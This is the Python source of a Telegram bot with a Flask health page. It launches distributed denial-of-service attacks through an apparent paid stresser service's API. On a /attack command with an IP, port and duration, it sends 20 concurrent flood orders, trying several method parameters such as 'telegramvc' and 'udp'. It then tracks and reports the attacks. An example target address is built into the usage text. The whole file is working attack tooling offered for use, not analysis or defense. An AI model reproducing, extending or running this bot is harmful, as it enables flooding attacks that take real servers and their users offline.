# app.py - Direct API Call with Correct Format
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
import re
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.attack_logs = []
        self.total_attacks = 0
        self.concurrent_busy = 0
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ Already running {user_attacks}/{MAX_CONCURRENT} concurrent attacks"
            if len(self.active_attacks) >= 100:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method, attack_num):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.total_attacks += 1
            self.concurrent_busy = len(self.active_attacks) + 1
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'attack_num': attack_num,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                self.concurrent_busy = max(0, self.concurrent_busy - 1)
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def get_stats(self):
        with self.lock:
            active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
            return {
                'active': active,
                'concurrent_busy': self.concurrent_busy,
                'total': self.total_attacks,
                'max': MAX_CONCURRENT
            }
    
    def log_attack(self, user_id, target, port, duration, method, status, response):
        self.attack_logs.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'status': status,
            'response': response[:500],
            'timestamp': datetime.now()
        })
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 15:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]
                self.concurrent_busy = max(0, self.concurrent_busy - 1)

attack_manager = AttackManager()

# ===== EXTRACT METHOD FROM HTML =====
def extract_method_from_html(html):
    """Extract method value from HTML response"""
    # Look for method in the response
    patterns = [
        r'method=["\']([^"\']+)["\']',
        r'name=["\']method["\']\s+value=["\']([^"\']+)["\']',
        r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html, re.IGNORECASE)
        if matches:
            for match in matches:
                if match.lower() not in ['', 'select', 'method', 'none', 'get', 'post']:
                    return match
    return "telegramvc"

# ===== DIRECT API CALL - WEBSITE FORMAT =====
async def send_attack_direct(target, port, duration, attack_num):
    """
    Direct API call using the exact format from the website
    """
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Try multiple parameter combinations
    param_combinations = [
        # Format 1: Direct from website
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "telegramvc"
        },
        # Format 2: With additional params
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "telegramvc",
            "network": "normal",
            "concurrent": "1"
        },
        # Format 3: Alternative method name
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "telegram-vc"
        },
        # Format 4: UDP method
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "udp"
        },
        # Format 5: With all params
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": "telegramvc",
            "network": "normal",
            "concurrent": "1",
            "servers": "LAYER 4 #1",
            "type": "udp"
        }
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests": "1"
    }
    
    for params in param_combinations:
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 20)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                
                # Try POST
                async with session.post(url, data=params, headers=headers) as response:
                    elapsed = time.time() - start_time
                    raw_response = await response.read()
                    
                    # Try to decode
                    try:
                        result_text = raw_response.decode('utf-8')
                    except:
                        result_text = raw_response.decode('utf-8', errors='ignore')
                    
                    # Check for success indicators
                    success_indicators = [
                        "SUCCESS",
                        "sent",
                        "attack",
                        "Host:",
                        "Concurrent:",
                        "1/1",
                        "successfully"
                    ]
                    
                    is_success = any(indicator in result_text for indicator in success_indicators)
                    
                    # Also check if it's not an HTML form
                    is_form = "<form" in result_text and "method" in result_text
                    
                    if is_success and not is_form:
                        logger.info(f"✅ Attack {attack_num} SUCCESS with params: {params}")
                        return {
                            "success": True,
                            "attack_num": attack_num,
                            "method_used": params.get("method", "unknown"),
                            "params_used": params,
                            "status": response.status,
                            "elapsed": f"{elapsed:.2f}s",
                            "response": result_text[:300],
                            "full_response": result_text
                        }
                    
                    # If we got a form, extract method and try again
                    if is_form:
                        extracted_method = extract_method_from_html(result_text)
                        if extracted_method and extracted_method != params.get("method"):
                            params["method"] = extracted_method
                            continue
                    
        except Exception as e:
            logger.error(f"Attack {attack_num} failed: {e}")
    
    # If all failed
    return {
        "success": False,
        "attack_num": attack_num,
        "error": "All formats failed"
    }

# ===== 20 CONCURRENT ATTACKS =====
async def send_20_concurrent_attacks(target, port, duration):
    """
    Launch 20 concurrent attacks on the same target
    """
    logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
    
    # Create 20 attack tasks
    tasks = []
    for i in range(1, 21):
        task = send_attack_direct(target, port, duration, i)
        tasks.append(task)
    
    # Run all attacks concurrently with rate limiting
    results = []
    for i in range(0, len(tasks), 5):
        batch = tasks[i:i+5]
        batch_results = await asyncio.gather(*batch)
        results.extend(batch_results)
        await asyncio.sleep(0.5)
    
    # Count successes
    success_count = sum(1 for r in results if r.get('success', False))
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results,
        "target": target,
        "port": port,
        "duration": duration
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        f"⚡ *20x TELEGRAM VC ATTACK BOT*\n\n"
        f"🔥 Status: ONLINE\n"
        f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📊 Total Attacks: {stats['total']}\n"
        f"🎯 Method: Auto-Detect\n"
        f"💪 Power: MAXIMUM\n\n"
        f"📌 *How to use:*\n"
        f"`/attack IP PORT TIME`\n\n"
        f"Example: `/attack 91.108.17.19 32001 60`\n\n"
        f"⚡ This launches 20 concurrent attacks!\n"
        f"⏱️ Time: 60-300 seconds",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
            "Example: `/attack 91.108.17.19 32001 60`\n\n"
            "⚡ This launches 20 concurrent attacks!\n"
            "⏱️ Time: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
            return
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *20x ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"🎯 Attacks: `20 CONCURRENT`\n"
            f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
            f"⏳ Launching 20 simultaneous attacks...",
            parse_mode='Markdown'
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "auto", 0)
        result = await send_20_concurrent_attacks(target, port, duration)
        
        attack_manager.log_attack(
            user_id, target, port, duration, "auto",
            "success" if result.get('success') else "failed",
            str(result)
        )
        
        # Build response
        if result.get('success'):
            response_text = (
                f"✅ *20x ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"🎯 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS\n\n"
            )
            
            # Show which method worked
            for r in result.get('results', []):
                if r.get('success'):
                    response_text += f"🎯 Working Method: `{r.get('method_used', 'N/A')}`\n"
                    break
        else:
            response_text = (
                f"❌ *20x ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ❌ FAILED\n\n"
            )
        
        # Show attack results
        if result.get('results'):
            response_text += f"📊 *Attack Results:*\n"
            for r in result['results'][:10]:
                status = "✅" if r.get('success') else "❌"
                attack_num = r.get('attack_num', 'N/A')
                method_used = r.get('method_used', 'N/A')
                status_code = r.get('status', 'N/A')
                response_text += f"{status} Attack {attack_num}: {method_used} - {status_code}\n"
            
            if len(result['results']) > 10:
                response_text += f"... and {len(result['results']) - 10} more\n"
        
        # Add first success response
        for r in result.get('results', []):
            if r.get('success') and r.get('response'):
                response_text += f"\n📡 *API Response:*\n```\n{r['response'][:200]}\n```"
                break
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time! Use numbers.\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *20x TELEGRAM VC ATTACK*\n\n"
        "Send in this format:\n"
        "`IP PORT TIME`\n\n"
        "Example: `91.108.17.19 32001 60`\n\n"
        "⚡ This launches 20 concurrent attacks!\n"
        "🎯 Method: Auto-Detect\n"
        "⏱️ Time: 60-300 seconds\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text(
                "❌ Use: `IP PORT TIME`\n"
                "Example: `91.108.17.19 32001 60`",
                parse_mode='Markdown'
            )
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Launching 20 attacks on {target}:{port} for {duration}s..."
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "auto", 0)
        result = await send_20_concurrent_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *20x ATTACK SUCCESS!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"🎯 Successful: `{result['successful']}/{result['total_attacks']}`\n"
                f"📊 Attack ID: `{attack_id}`\n"
            )
        else:
            response_text = (
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attack ID: `{attack_id}`\n"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"🎯 Method: Auto-Detect\n"
        f"💪 Power: MAXIMUM\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown'
    )

async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks(query.from_user.id)
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: `{query.from_user.id}`\n"
        f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"🎯 Method: Auto-Detect\n"
        f"💪 Power: MAXIMUM\n"
        f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
        f"📌 *Method:* Auto-Detects best method",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 ACTIVE", callback_data="admin_active")],
        [InlineKeyboardButton("📈 STATS", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    stats = attack_manager.get_stats()
    
    if not active:
        text = f"📊 *NO ACTIVE ATTACKS*\n\nConcurrent: {stats['concurrent_busy']}/{stats['max']}"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\nConcurrent: {stats['concurrent_busy']}/{stats['max']}\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` - {att['target']}:{att['port']} - {remaining}s left\n"
    
    await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]]))

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    await query.edit_message_text(
        f"📈 *BOT STATISTICS*\n\n"
        f"⚡ Active: {stats['active']}\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total Attacks: {stats['total']}\n"
        f"🎯 Method: Auto-Detect\n"
        f"💪 Power: MAXIMUM\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"🌐 Status: ONLINE",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        f"⚡ *MAIN MENU*\n\n"
        f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
        f"📈 Total: {stats['total']}\n"
        f"🎯 Method: Auto-Detect\n"
        f"🌐 Status: ONLINE",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
    app.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ 20x TELEGRAM VC ATTACK BOT")
    print("🎯 Method: Auto-Detect")
    print("⚡ 20 Concurrent Attacks")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)